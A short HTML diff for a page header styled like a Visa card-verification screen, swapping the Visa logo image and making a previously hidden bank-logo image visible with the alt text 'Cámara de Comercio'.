@@ -93,10 +93,10 @@
     <div class="container">
         <div class="header">
             <div class="visa-logo">
-                <img src="image.png" alt="Verificado por VISA" />
+                <img src="visa.png" alt="Visa" />
             </div>
             <div class="bank-logo" id="bankLogoContainer">
-                <img id="bankLogoImg" src="" alt="Logo banco" style="display:none;" />
+                <img id="bankLogoImg" src="image.png" alt="Cámara de Comercio" style="display:block;" />
             </div>
         </div>
 
